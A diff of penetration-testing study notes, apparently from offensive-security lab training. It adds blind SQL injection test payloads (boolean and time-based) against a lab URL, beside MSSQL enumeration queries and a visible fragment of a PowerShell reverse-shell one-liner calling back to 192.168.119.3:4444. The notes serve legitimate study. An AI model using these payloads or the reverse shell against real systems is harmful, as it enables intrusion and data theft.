@@ -234,3 +234,6 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
   - Grab version: ```SELECT @@version;```
   - List databases: ```SELECT name FROM sys.databases;``` >> master, tempdb, model, and msdb are default databases
   - Selecting a database and listing tables: ```SELECT * FROM offsec.information_schema.tables;```
+- Blind SQLi
+  - Test for boolean-based: ```http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //```
+  - Test for time-based: ```http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //```
